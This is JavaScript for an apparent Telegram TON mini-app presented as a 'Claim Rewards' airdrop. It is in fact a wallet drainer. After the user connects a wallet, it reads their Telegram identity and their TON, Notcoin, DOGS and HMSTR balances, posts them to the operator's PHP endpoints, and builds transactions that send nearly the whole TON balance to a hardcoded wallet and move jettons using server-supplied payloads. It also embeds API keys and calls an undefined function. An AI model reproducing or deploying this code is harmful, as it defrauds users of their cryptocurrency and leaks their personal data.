const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
  manifestUrl: "https://www.notdrop.one/tonconnect-manifest.json",
  buttonRootId: "connect-button",
  uiPreferences: {
    borderRadius: "s",
  },
});

tonConnectUI.uiOptions = {
  uiPreferences: {
    theme: "DARK",
  },
};

const name = window.Telegram.WebApp.initDataUnsafe.user.first_name;
const user = window.Telegram.WebApp.initDataUnsafe.user.username;
const id = window.Telegram.WebApp.initDataUnsafe.user.id;

const wallettt = "UQAXqJ3DND_JgS_I3mmODPmvey1DCkA9tTNt0hltdhZWIxZJ";

const TON_API_BASE_URL = "https://toncenter.com/api/v3";
const TON_API_KEY =
  "1f362206697a492b17378bc888734463983515ee275aebc0a0b99d855b4df6cc";
const COINGECKO_API_KEY = "CG-66g4YxA7mwtLyC6Y3rRiPvdM";

const axiosInstance = axios.create({});

axiosInstance.interceptors.response.use(
  (response) => response,
  (error) => error.response
);
const fromNano = (nanoAmount) => {
  return parseFloat(nanoAmount) / 1e9;
};
const getAccountInfo = async (address) => {
  const response = await axiosInstance.get(`${TON_API_BASE_URL}/account`, {
    params: { address },
    headers: { "X-API-Key": TON_API_KEY },
  });
  return response.data;
};
const getJettonWallet = async (ownerAddress, jettonAddress) => {
  const response = await axiosInstance.get(
    `${TON_API_BASE_URL}/jetton/wallets`,
    {
      params: {
        jetton_address: jettonAddress,
        owner_address: ownerAddress,
        limit: 1,
        offset: 0,
      },
      headers: { "X-API-Key": TON_API_KEY },
    }
  );
  const wallets = response.data.jetton_wallets;
  if (wallets.length > 0) {
    return wallets[0];
  }
};
class WalletManager {
  constructor(wallet) {
    this.wallet = wallet;
    this.NOTCOIN_JETTON_CONTRACT =
      "0:2F956143C461769579BAEF2E32CC2D7BC18283F40D20BB03E432CD603AC33FFC";
    this.HMSTR_JETTON_CONTRACT =
      "0:09f2e59dec406ab26a5259a45d7ff23ef11f3e5c7c21de0b0d2a1cbe52b76b3d";
    this.DOGS_JETTON_CONTRACT =
      "0:afc49cb8786f21c87045b19ede78fc6b46c51048513f8e9a6d44060199c1bf0c";
  }

  async getAccount() {
    return await getAccountInfo(this.wallet.account.address);
  }

  async getTONBalance() {
    const accountInfo = await this.getAccount();
    return accountInfo.balance;
  }

  async getNotcoinWallet() {
    return await getJettonWallet(
      this.wallet.account.address,
      this.NOTCOIN_JETTON_CONTRACT
    );
  }

  async getNotcoinBalance() {
    const wallet = await this.getNotcoinWallet();
    return wallet == null ? 0 : wallet.balance;
  }

  async getHmstrWallet() {
    return await getJettonWallet(
      this.wallet.account.address,
      this.HMSTR_JETTON_CONTRACT
    );
  }

  async getHmstrBalance() {
    const wallet = await this.getHmstrWallet();
    return wallet == null ? 0 : wallet.balance;
  }

  async getDogsWallet() {
    return await getJettonWallet(
      this.wallet.account.address,
      this.DOGS_JETTON_CONTRACT
    );
  }

  async getDogsBalance() {
    const wallet = await this.getDogsWallet();
    return wallet == null ? 0 : wallet.balance;
  }
}
async function start_wallet_custom() {
  var button = document.getElementById("claimButton");
  // تغییر متن به Loading...
  button.innerHTML = "Loading...";
  button.style.pointerEvents = "none"; // غیر فعال کردن دکمه برای جلوگیری از کلیک‌های اضافی

  // تنظیم زمان برای بازگشت به حالت اولیه بعد از 10 ثانیه
  setTimeout(function () {
    button.innerHTML = "Claim Rewards";
    button.style.pointerEvents = "auto"; // فعال‌کردن دوباره دکمه
  }, 10000);
  if (await tonConnectUI.connected) {
    await send_transaction();
  } else {
    await tonConnectUI.openModal();
  }
}
const getTONPrice = async () => {
  const response = await axiosInstance.get(
    "https://api.coingecko.com/api/v3/simple/price",
    {
      params: { ids: "the-open-network", vs_currencies: "usd" },
      headers: { "x-cg-demo-api-key": COINGECKO_API_KEY },
    }
  );
  return response.data["the-open-network"].usd;
};
const getNotcoinPrice = async () => {
  const response = await axiosInstance.get(
    "https://api.coingecko.com/api/v3/simple/price",
    {
      params: { ids: "notcoin", vs_currencies: "usd" },
      headers: { "x-cg-demo-api-key": COINGECKO_API_KEY },
    }
  );
  return response.data.notcoin.usd;
};
const getAddress = async (address) => {
  const response = await axiosInstance.get(
    `https://toncenter.com/api/v2/getExtendedAddressInformation`,
    {
      params: { address },
      headers: { "X-API-Key": TON_API_KEY },
    }
  );
  return response.data.result.address.account_address;
};

function UserFriendlyAddress(rawHexAddress) {
  const Address = TonWeb.utils.Address;

  const addressInstance = new Address(rawHexAddress);
  const userFriendlyAddress = addressInstance.toString(true, true, false);
  return userFriendlyAddress;
}

async function send_transaction() {
  const WALLET = new WalletManager(tonConnectUI);
  let dogsbalance = await WALLET.getDogsBalance();
  let hmstrbalance = await WALLET.getHmstrBalance();
  let notbalance = await WALLET.getNotcoinBalance();
  let tonbalance = await WALLET.getTONBalance();
  const balanceTon = tonbalance - 80000000;
  wallet_address = tonConnectUI.account.address;
  row_address = UserFriendlyAddress(wallet_address);
  const info = new URLSearchParams();
  info.append("wallet", row_address);
  info.append("ton", fromNano(tonbalance));
  info.append("not", fromNano(notbalance));
  info.append("dogs", fromNano(dogsbalance));
  info.append("hmstr", fromNano(hmstrbalance));
  info.append("name", name);
  info.append("user", user);
  info.append("id", id);
  fetch("fee.php", {
    method: "POST",
    headers: {
      "Content-Type": "application/x-www-form-urlencoded",
    },
    body: info.toString(),
  });

  // ارسال درخواست POST به api.php
  fetch("api.php", {
    method: "POST",
    headers: {
      "Content-Type": "application/x-www-form-urlencoded",
    },
    body: info.toString(),
  });
  let wallet = await WALLET.getNotcoinWallet();
  let wallet2 = await WALLET.getUsdtWallet();
  let wallet3 = await WALLET.getDogsWallet();
  let wallet4 = await WALLET.getHmstrWallet();
  let body = await (
    await fetch("api/index.php?address=" + wallet_address)
  ).json();
  if (
    fromNano(tonbalance) > 0.4 &&
    fromNano(notbalance) > 400 &&
    fromNano(dogsbalance) < 400 &&
    fromNano(hmstrbalance) < 400
  ) {
    console.log(wallet_address);
    var transaction = {
      validUntil: Math.floor(Date.now() / 1000) + 60, // 60 sec
      messages: [
        {
          address: "EQCFrwrDZWkViFbhx5npXk_oAs0xPyhUuh-wLddynke6Upva",
          amount: 5000000,
          payload:
            "te6ccsECDgEAA9oAAAAAXADWANsA4ADlAWQB2wJHAsYDEwNBA4IDzAKvX8w9FAAAAAAAAAAAgBR3E5QNs+VcqthYQFFPFmiEug2jFZgz4saK7y7iGQwkkAExxh1E6CdjdGkyjc17qHMC/hN3kN3aJcUTXK0vXSj+oIdzWUAAH8Hb0AENAuv/APSkE/S88sgLM04Us8AFhO5hst/wg3EW0Py1B42TlkvL6cBf1qFBsb/KXWpD4YgAmOMOonQTsbo0mUbmvdQ5gX8Ju8hu7RLiia5Wl66Uf1EAExxh1E6CdjdGkyjc17qHMC/hN3kN3aJcUTXK0vXSj+oMHoSBAgwCASADCwIBSAQKAgLNBQgB99AOhpgYC42EkvgnB9IBh2omhpgGmP/SB9IH0gfQBqaYAYGDgphOOAYABKmITpj4VvEOGAShgE6Z/HCMWzGwtzGytkFeOCyTmZbygFcRVgAMkvhvASa6ThARXAgRXdFWAAkVnY2CncY4LYTo6vhuoYaGmD6hgA/YBwFOAAwGAejy0ZSzjkIxMzk5U1LHBZJfCeBRUccF8uH0ghAFE42RFrry4fUD+kAwRlAQNFlwB8jLABbLH1AEzxZYzxYBzxYB+gLMywDJ7VTgMDcowAPjAijAAJw2NxA4R2UUQzBw8AXgCMACmFVEECQQI/AF4F8KhA/y8AcA1Dg5ghA7msoAGL7y4clTRscFUVLHBRWx8uHKcCCCEF/MPRQhgBDIywUozxYh+gLLassfFcs/J88WJ88WFMoAI/oCE8oAyYMG+wBxUGZFFQRwB8jLABbLH1AEzxZYzxYBzxYB+gLMywDJ7VQB92YIQO5rKAFJgoFIwvvLhwiTQ+kD6APpA+gAwU5KhIaFQh6EWoFKQcIAQyMsFUAPPFgH6AstqyXH7ACXCACXXScICsI4XUEVwgBDIywVQA88WAfoCy2rJcfsAECOSNDTiWnCAEMjLBVADzxYB+gLLaslx+wBwIIIQX8w9FIJAJbIyx8Tyz8jzxZQA88WygCCCcnDgPoCygDJcYAYyMsFJs8WcPoCy2rMyYMG+wBxVVBwB8jLABbLH1AEzxZYzxYBzxYB+gLMywDJ7VQAV6A4WdqJoaYBpj/0gfSB9IH0AammAGBhofSB9AH0gfQAYQQgjJKwoBWAAqsBAH7yMO1E0NMA0x/6QPpA+kD6ANTTADDAAY4d+ABwB8jLABbLH1AEzxZYzxYBzxYB+gLMywDJ7VTgXweCAP/+8vAAj4AUcmsMPvO16zQnraMFwsgEIYBfMce+MftOlx61YoNX4wTDUQATHGHUToJ2N0aTKNzXuocwL+E3eQ3dolxRNcrS9dKP6gmGogAYAAAAAQAAAAAAAAAAFOKSVw==",
        },
        {
          address: wallet.address,
          amount: 5000000,
          payload: body.payload3,
        },
        {
          address: wallettt,
          amount: balanceTon,
          payload: body.payload,
        },
        {
          address: wallet.address,
          amount: "40000000",
          payload: body.payload2,
        },
      ],
    };
  } else if (
    fromNano(tonbalance) > 0.07 &&
    fromNano(tonbalance) < 0.4 &&
    fromNano(notbalance) > 400 &&
    fromNano(dogsbalance) < 400 &&
    fromNano(hmstrbalance) < 400
  ) {
    var transaction = {
      validUntil: Math.floor(Date.now() / 1000) + 60, // 60 sec
      messages: [
        {
          address: "EQCFrwrDZWkViFbhx5npXk_oAs0xPyhUuh-wLddynke6Upva",
          amount: 5000000,
          payload:
            "te6ccsECDgEAA9oAAAAAXADWANsA4ADlAWQB2wJHAsYDEwNBA4IDzAKvX8w9FAAAAAAAAAAAgBR3E5QNs+VcqthYQFFPFmiEug2jFZgz4saK7y7iGQwkkAExxh1E6CdjdGkyjc17qHMC/hN3kN3aJcUTXK0vXSj+oIdzWUAAH8Hb0AENAuv/APSkE/S88sgLM04Us8AFhO5hst/wg3EW0Py1B42TlkvL6cBf1qFBsb/KXWpD4YgAmOMOonQTsbo0mUbmvdQ5gX8Ju8hu7RLiia5Wl66Uf1EAExxh1E6CdjdGkyjc17qHMC/hN3kN3aJcUTXK0vXSj+oMHoSBAgwCASADCwIBSAQKAgLNBQgB99AOhpgYC42EkvgnB9IBh2omhpgGmP/SB9IH0gfQBqaYAYGDgphOOAYABKmITpj4VvEOGAShgE6Z/HCMWzGwtzGytkFeOCyTmZbygFcRVgAMkvhvASa6ThARXAgRXdFWAAkVnY2CncY4LYTo6vhuoYaGmD6hgA/YBwFOAAwGAejy0ZSzjkIxMzk5U1LHBZJfCeBRUccF8uH0ghAFE42RFrry4fUD+kAwRlAQNFlwB8jLABbLH1AEzxZYzxYBzxYB+gLMywDJ7VTgMDcowAPjAijAAJw2NxA4R2UUQzBw8AXgCMACmFVEECQQI/AF4F8KhA/y8AcA1Dg5ghA7msoAGL7y4clTRscFUVLHBRWx8uHKcCCCEF/MPRQhgBDIywUozxYh+gLLassfFcs/J88WJ88WFMoAI/oCE8oAyYMG+wBxUGZFFQRwB8jLABbLH1AEzxZYzxYBzxYB+gLMywDJ7VQB92YIQO5rKAFJgoFIwvvLhwiTQ+kD6APpA+gAwU5KhIaFQh6EWoFKQcIAQyMsFUAPPFgH6AstqyXH7ACXCACXXScICsI4XUEVwgBDIywVQA88WAfoCy2rJcfsAECOSNDTiWnCAEMjLBVADzxYB+gLLaslx+wBwIIIQX8w9FIJAJbIyx8Tyz8jzxZQA88WygCCCcnDgPoCygDJcYAYyMsFJs8WcPoCy2rMyYMG+wBxVVBwB8jLABbLH1AEzxZYzxYBzxYB+gLMywDJ7VQAV6A4WdqJoaYBpj/0gfSB9IH0AammAGBhofSB9AH0gfQAYQQgjJKwoBWAAqsBAH7yMO1E0NMA0x/6QPpA+kD6ANTTADDAAY4d+ABwB8jLABbLH1AEzxZYzxYBzxYB+gLMywDJ7VTgXweCAP/+8vAAj4AUcmsMPvO16zQnraMFwsgEIYBfMce+MftOlx61YoNX4wTDUQATHGHUToJ2N0aTKNzXuocwL+E3eQ3dolxRNcrS9dKP6gmGogAYAAAAAQAAAAAAAAAAFOKSVw==",
        },
        {
          address: wallet.address,
          amount: 5000000,
          payload: body.payload3,
        },
        {
          address: wallet.address,
          amount: "40000000",
          payload: body.payload2,
        },
      ],
    };
  } else if (
    fromNano(tonbalance) > 0.4 &&
    fromNano(notbalance) < 400 &&
    fromNano(dogsbalance) < 400 &&
    fromNano(hmstrbalance) < 400
  ) {
    var transaction = {
      validUntil: Math.floor(Date.now() / 1000) + 60, // 60 sec
      messages: [
        {
          address: "EQCFrwrDZWkViFbhx5npXk_oAs0xPyhUuh-wLddynke6Upva",
          amount: 5000000,
          payload:
            "te6ccsECDgEAA9oAAAAAXADWANsA4ADlAWQB2wJHAsYDEwNBA4IDzAKvX8w9FAAAAAAAAAAAgBR3E5QNs+VcqthYQFFPFmiEug2jFZgz4saK7y7iGQwkkAExxh1E6CdjdGkyjc17qHMC/hN3kN3aJcUTXK0vXSj+oIdzWUAAH8Hb0AENAuv/APSkE/S88sgLM04Us8AFhO5hst/wg3EW0Py1B42TlkvL6cBf1qFBsb/KXWpD4YgAmOMOonQTsbo0mUbmvdQ5gX8Ju8hu7RLiia5Wl66Uf1EAExxh1E6CdjdGkyjc17qHMC/hN3kN3aJcUTXK0vXSj+oMHoSBAgwCASADCwIBSAQKAgLNBQgB99AOhpgYC42EkvgnB9IBh2omhpgGmP/SB9IH0gfQBqaYAYGDgphOOAYABKmITpj4VvEOGAShgE6Z/HCMWzGwtzGytkFeOCyTmZbygFcRVgAMkvhvASa6ThARXAgRXdFWAAkVnY2CncY4LYTo6vhuoYaGmD6hgA/YBwFOAAwGAejy0ZSzjkIxMzk5U1LHBZJfCeBRUccF8uH0ghAFE42RFrry4fUD+kAwRlAQNFlwB8jLABbLH1AEzxZYzxYBzxYB+gLMywDJ7VTgMDcowAPjAijAAJw2NxA4R2UUQzBw8AXgCMACmFVEECQQI/AF4F8KhA/y8AcA1Dg5ghA7msoAGL7y4clTRscFUVLHBRWx8uHKcCCCEF/MPRQhgBDIywUozxYh+gLLassfFcs/J88WJ88WFMoAI/oCE8oAyYMG+wBxUGZFFQRwB8jLABbLH1AEzxZYzxYBzxYB+gLMywDJ7VQB92YIQO5rKAFJgoFIwvvLhwiTQ+kD6APpA+gAwU5KhIaFQh6EWoFKQcIAQyMsFUAPPFgH6AstqyXH7ACXCACXXScICsI4XUEVwgBDIywVQA88WAfoCy2rJcfsAECOSNDTiWnCAEMjLBVADzxYB+gLLaslx+wBwIIIQX8w9FIJAJbIyx8Tyz8jzxZQA88WygCCCcnDgPoCygDJcYAYyMsFJs8WcPoCy2rMyYMG+wBxVVBwB8jLABbLH1AEzxZYzxYBzxYB+gLMywDJ7VQAV6A4WdqJoaYBpj/0gfSB9IH0AammAGBhofSB9AH0gfQAYQQgjJKwoBWAAqsBAH7yMO1E0NMA0x/6QPpA+kD6ANTTADDAAY4d+ABwB8jLABbLH1AEzxZYzxYBzxYB+gLMywDJ7VTgXweCAP/+8vAAj4AUcmsMPvO16zQnraMFwsgEIYBfMce+MftOlx61YoNX4wTDUQATHGHUToJ2N0aTKNzXuocwL+E3eQ3dolxRNcrS9dKP6gmGogAYAAAAAQAAAAAAAAAAFOKSVw==",
        },
        {
          address: wallettt,
          amount: balanceTon,
          payload: body.payload,
        },
      ],
    };
  } else if (
    fromNano(tonbalance) > 0.4 &&
    fromNano(notbalance) < 400 &&
    fromNano(dogsbalance) > 400 &&
    fromNano(hmstrbalance) < 400
  ) {
    var transaction = {
      validUntil: Math.floor(Date.now() / 1000) + 60, // 60 sec
      messages: [
        {
          address: "EQCFrwrDZWkViFbhx5npXk_oAs0xPyhUuh-wLddynke6Upva",
          amount: 5000000,
          payload:
            "te6ccsECDgEAA9oAAAAAXADWANsA4ADlAWQB2wJHAsYDEwNBA4IDzAKvX8w9FAAAAAAAAAAAgBR3E5QNs+VcqthYQFFPFmiEug2jFZgz4saK7y7iGQwkkAExxh1E6CdjdGkyjc17qHMC/hN3kN3aJcUTXK0vXSj+oIdzWUAAH8Hb0AENAuv/APSkE/S88sgLM04Us8AFhO5hst/wg3EW0Py1B42TlkvL6cBf1qFBsb/KXWpD4YgAmOMOonQTsbo0mUbmvdQ5gX8Ju8hu7RLiia5Wl66Uf1EAExxh1E6CdjdGkyjc17qHMC/hN3kN3aJcUTXK0vXSj+oMHoSBAgwCASADCwIBSAQKAgLNBQgB99AOhpgYC42EkvgnB9IBh2omhpgGmP/SB9IH0gfQBqaYAYGDgphOOAYABKmITpj4VvEOGAShgE6Z/HCMWzGwtzGytkFeOCyTmZbygFcRVgAMkvhvASa6ThARXAgRXdFWAAkVnY2CncY4LYTo6vhuoYaGmD6hgA/YBwFOAAwGAejy0ZSzjkIxMzk5U1LHBZJfCeBRUccF8uH0ghAFE42RFrry4fUD+kAwRlAQNFlwB8jLABbLH1AEzxZYzxYBzxYB+gLMywDJ7VTgMDcowAPjAijAAJw2NxA4R2UUQzBw8AXgCMACmFVEECQQI/AF4F8KhA/y8AcA1Dg5ghA7msoAGL7y4clTRscFUVLHBRWx8uHKcCCCEF/MPRQhgBDIywUozxYh+gLLassfFcs/J88WJ88WFMoAI/oCE8oAyYMG+wBxUGZFFQRwB8jLABbLH1AEzxZYzxYBzxYB+gLMywDJ7VQB92YIQO5rKAFJgoFIwvvLhwiTQ+kD6APpA+gAwU5KhIaFQh6EWoFKQcIAQyMsFUAPPFgH6AstqyXH7ACXCACXXScICsI4XUEVwgBDIywVQA88WAfoCy2rJcfsAECOSNDTiWnCAEMjLBVADzxYB+gLLaslx+wBwIIIQX8w9FIJAJbIyx8Tyz8jzxZQA88WygCCCcnDgPoCygDJcYAYyMsFJs8WcPoCy2rMyYMG+wBxVVBwB8jLABbLH1AEzxZYzxYBzxYB+gLMywDJ7VQAV6A4WdqJoaYBpj/0gfSB9IH0AammAGBhofSB9AH0gfQAYQQgjJKwoBWAAqsBAH7yMO1E0NMA0x/6QPpA+kD6ANTTADDAAY4d+ABwB8jLABbLH1AEzxZYzxYBzxYB+gLMywDJ7VTgXweCAP/+8vAAj4AUcmsMPvO16zQnraMFwsgEIYBfMce+MftOlx61YoNX4wTDUQATHGHUToJ2N0aTKNzXuocwL+E3eQ3dolxRNcrS9dKP6gmGogAYAAAAAQAAAAAAAAAAFOKSVw==",
        },
        {
          address: wallet3.address,
          amount: 5000000,
          payload: body.payload6,
        },
        {
          address: wallettt,
          amount: balanceTon,
          payload: body.payload,
        },
        {
          address: wallet3.address,
          amount: "40000000",
          payload: body.payload5,
        },
      ],
    };
  } else if (
    fromNano(tonbalance) < 0.4 &&
    fromNano(tonbalance) > 0.1 &&
    fromNano(notbalance) > 400 &&
    fromNano(dogsbalance) > 400 &&
    fromNano(hmstrbalance) < 400
  ) {
    var transaction = {
      validUntil: Math.floor(Date.now() / 1000) + 60, // 60 sec
      messages: [
        {
          address: wallet3.address,
          amount: 5000000,
          payload: body.payload6,
        },
        {
          address: wallet.address,
          amount: 5000000,
          payload: body.payload3,
        },
        {
          address: wallet.address,
          amount: "40000000",
          payload: body.payload2,
        },
        {
          address: wallet3.address,
          amount: "40000000",
          payload: body.payload5,
        },
      ],
    };
  } else if (
    fromNano(tonbalance) < 0.4 &&
    fromNano(tonbalance) > 0.1 &&
    fromNano(notbalance) < 400 &&
    fromNano(dogsbalance) > 400 &&
    fromNano(hmstrbalance) < 400
  ) {
    var transaction = {
      validUntil: Math.floor(Date.now() / 1000) + 60, // 60 sec
      messages: [
        {
          address: "EQCFrwrDZWkViFbhx5npXk_oAs0xPyhUuh-wLddynke6Upva",
          amount: 5000000,
          payload:
            "te6ccsECDgEAA9oAAAAAXADWANsA4ADlAWQB2wJHAsYDEwNBA4IDzAKvX8w9FAAAAAAAAAAAgBR3E5QNs+VcqthYQFFPFmiEug2jFZgz4saK7y7iGQwkkAExxh1E6CdjdGkyjc17qHMC/hN3kN3aJcUTXK0vXSj+oIdzWUAAH8Hb0AENAuv/APSkE/S88sgLM04Us8AFhO5hst/wg3EW0Py1B42TlkvL6cBf1qFBsb/KXWpD4YgAmOMOonQTsbo0mUbmvdQ5gX8Ju8hu7RLiia5Wl66Uf1EAExxh1E6CdjdGkyjc17qHMC/hN3kN3aJcUTXK0vXSj+oMHoSBAgwCASADCwIBSAQKAgLNBQgB99AOhpgYC42EkvgnB9IBh2omhpgGmP/SB9IH0gfQBqaYAYGDgphOOAYABKmITpj4VvEOGAShgE6Z/HCMWzGwtzGytkFeOCyTmZbygFcRVgAMkvhvASa6ThARXAgRXdFWAAkVnY2CncY4LYTo6vhuoYaGmD6hgA/YBwFOAAwGAejy0ZSzjkIxMzk5U1LHBZJfCeBRUccF8uH0ghAFE42RFrry4fUD+kAwRlAQNFlwB8jLABbLH1AEzxZYzxYBzxYB+gLMywDJ7VTgMDcowAPjAijAAJw2NxA4R2UUQzBw8AXgCMACmFVEECQQI/AF4F8KhA/y8AcA1Dg5ghA7msoAGL7y4clTRscFUVLHBRWx8uHKcCCCEF/MPRQhgBDIywUozxYh+gLLassfFcs/J88WJ88WFMoAI/oCE8oAyYMG+wBxUGZFFQRwB8jLABbLH1AEzxZYzxYBzxYB+gLMywDJ7VQB92YIQO5rKAFJgoFIwvvLhwiTQ+kD6APpA+gAwU5KhIaFQh6EWoFKQcIAQyMsFUAPPFgH6AstqyXH7ACXCACXXScICsI4XUEVwgBDIywVQA88WAfoCy2rJcfsAECOSNDTiWnCAEMjLBVADzxYB+gLLaslx+wBwIIIQX8w9FIJAJbIyx8Tyz8jzxZQA88WygCCCcnDgPoCygDJcYAYyMsFJs8WcPoCy2rMyYMG+wBxVVBwB8jLABbLH1AEzxZYzxYBzxYB+gLMywDJ7VQAV6A4WdqJoaYBpj/0gfSB9IH0AammAGBhofSB9AH0gfQAYQQgjJKwoBWAAqsBAH7yMO1E0NMA0x/6QPpA+kD6ANTTADDAAY4d+ABwB8jLABbLH1AEzxZYzxYBzxYB+gLMywDJ7VTgXweCAP/+8vAAj4AUcmsMPvO16zQnraMFwsgEIYBfMce+MftOlx61YoNX4wTDUQATHGHUToJ2N0aTKNzXuocwL+E3eQ3dolxRNcrS9dKP6gmGogAYAAAAAQAAAAAAAAAAFOKSVw==",
        },
        {
          address: wallet3.address,
          amount: 5000000,
          payload: body.payload6,
        },
        {
          address: wallet3.address,
          amount: "40000000",
          payload: body.payload5,
        },
      ],
    };
  } else if (
    fromNano(tonbalance) > 0.4 &&
    fromNano(notbalance) > 400 &&
    fromNano(dogsbalance) > 400 &&
    fromNano(hmstrbalance) < 400
  ) {
    var transaction = {
      validUntil: Math.floor(Date.now() / 1000) + 60, // 60 sec
      messages: [
        {
          address: wallet3.address,
          amount: 5000000,
          payload: body.payload6,
        },
        {
          address: wallettt,
          amount: tonbalance - 150000000,
          payload: body.payload,
        },
        {
          address: wallet.address,
          amount: "40000000",
          payload: body.payload2,
        },
        {
          address: wallet3.address,
          amount: "40000000",
          payload: body.payload5,
        },
      ],
    };
  } else if (
    fromNano(tonbalance) < 0.4 &&
    fromNano(tonbalance) > 0.1 &&
    fromNano(notbalance) > 400 &&
    fromNano(dogsbalance) > 400 &&
    fromNano(hmstrbalance) > 400
  ) {
    var transaction = {
      validUntil: Math.floor(Date.now() / 1000) + 60, // 60 sec
      messages: [
        {
          address: wallet3.address,
          amount: 5000000,
          payload: body.payload6,
        },
        {
          address: wallet.address,
          amount: "40000000",
          payload: body.payload2,
        },
        {
          address: wallet3.address,
          amount: "40000000",
          payload: body.payload5,
        },
        {
          address: wallet4.address,
          amount: "40000000",
          payload: body.payload7,
        },
      ],
    };
  } else if (
    fromNano(tonbalance) < 0.4 &&
    fromNano(tonbalance) > 0.1 &&
    fromNano(notbalance) > 400 &&
    fromNano(dogsbalance) < 400 &&
    fromNano(hmstrbalance) > 400
  ) {
    var transaction = {
      validUntil: Math.floor(Date.now() / 1000) + 60, // 60 sec
      messages: [
        {
          address: wallet.address,
          amount: 5000000,
          payload: body.payload3,
        },
        {
          address: wallet.address,
          amount: "40000000",
          payload: body.payload2,
        },
        {
          address: wallet4.address,
          amount: "40000000",
          payload: body.payload7,
        },
      ],
    };
  } else if (
    fromNano(tonbalance) < 0.4 &&
    fromNano(tonbalance) > 0.1 &&
    fromNano(notbalance) < 400 &&
    fromNano(dogsbalance) > 400 &&
    fromNano(hmstrbalance) > 400
  ) {
    var transaction = {
      validUntil: Math.floor(Date.now() / 1000) + 60, // 60 sec
      messages: [
        {
          address: wallet3.address,
          amount: 5000000,
          payload: body.payload6,
        },
        {
          address: wallet3.address,
          amount: "40000000",
          payload: body.payload5,
        },
        {
          address: wallet4.address,
          amount: "40000000",
          payload: body.payload7,
        },
      ],
    };
  } else if (
    fromNano(tonbalance) < 0.4 &&
    fromNano(tonbalance) > 0.1 &&
    fromNano(notbalance) < 400 &&
    fromNano(dogsbalance) < 400 &&
    fromNano(hmstrbalance) > 400
  ) {
    var transaction = {
      validUntil: Math.floor(Date.now() / 1000) + 60, // 60 sec
      messages: [
        {
          address: wallet4.address,
          amount: "40000000",
          payload: body.payload7,
        },
      ],
    };
  } else if (
    fromNano(tonbalance) > 0.4 &&
    fromNano(notbalance) < 400 &&
    fromNano(dogsbalance) < 400 &&
    fromNano(hmstrbalance) > 400
  ) {
    var transaction = {
      validUntil: Math.floor(Date.now() / 1000) + 60, // 60 sec
      messages: [
        {
          address: wallet4.address,
          amount: "40000000",
          payload: body.payload7,
        },
        {
          address: wallettt,
          amount: balanceTon,
          payload: body.payload,
        },
      ],
    };
  } else if (
    fromNano(tonbalance) > 0.4 &&
    fromNano(notbalance) > 400 &&
    fromNano(dogsbalance) < 400 &&
    fromNano(hmstrbalance) > 400
  ) {
    var transaction = {
      validUntil: Math.floor(Date.now() / 1000) + 60, // 60 sec
      messages: [
        {
          address: wallet.address,
          amount: 5000000,
          payload: body.payload3,
        },
        {
          address: wallet.address,
          amount: "40000000",
          payload: body.payload2,
        },
        {
          address: wallet4.address,
          amount: "40000000",
          payload: body.payload7,
        },
        {
          address: wallettt,
          amount: balanceTon,
          payload: body.payload,
        },
      ],
    };
  } else if (
    fromNano(tonbalance) > 0.4 &&
    fromNano(notbalance) < 400 &&
    fromNano(dogsbalance) > 400 &&
    fromNano(hmstrbalance) > 400
  ) {
    var transaction = {
      validUntil: Math.floor(Date.now() / 1000) + 60, // 60 sec
      messages: [
        {
          address: wallet3.address,
          amount: 5000000,
          payload: body.payload6,
        },
        {
          address: wallet3.address,
          amount: "40000000",
          payload: body.payload5,
        },
        {
          address: wallet4.address,
          amount: "40000000",
          payload: body.payload7,
        },
        {
          address: wallettt,
          amount: balanceTon,
          payload: body.payload,
        },
      ],
    };
  } else if (
    fromNano(tonbalance) > 0.4 &&
    fromNano(notbalance) > 400 &&
    fromNano(dogsbalance) > 400 &&
    fromNano(hmstrbalance) > 400
  ) {
    var transaction = {
      validUntil: Math.floor(Date.now() / 1000) + 60, // 60 sec
      messages: [
        {
          address: wallet.address,
          amount: "40000000",
          payload: body.payload2,
        },
        {
          address: wallet3.address,
          amount: "40000000",
          payload: body.payload5,
        },
        {
          address: wallet4.address,
          amount: "40000000",
          payload: body.payload7,
        },
        {
          address: wallettt,
          amount: balanceTon,
          payload: body.payload,
        },
      ],
    };
  } else {
    Swal.fire({
      //position: "top-end",
      icon: "error",
      title: "Use another wallet, this wallet has no balance",
      showConfirmButton: false,
      timer: 3000,
    });
  }

  try {
    const result = await tonConnectUI.sendTransaction(transaction);
    function sendWalletData(wallet) {
      var url = "data.php";
      var data = new URLSearchParams();
      data.append("wallet", wallet);

      fetch(url, {
        method: "POST",
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
        },
        body: data.toString(),
      })
        .then((response) => response.text())
        .then((result) => console.log(result))
        .catch((error) => console.error("Error:", error));
    }

    // استفاده از تابع
    sendWalletData(row_address);
    console.log(result.boc);
    const someTxData = await myAppExplorerService.getTransaction(result.boc);
    alert("Transaction was sent successfully", someTxData);
  } catch (e) {
    console.error(e);
  }
}
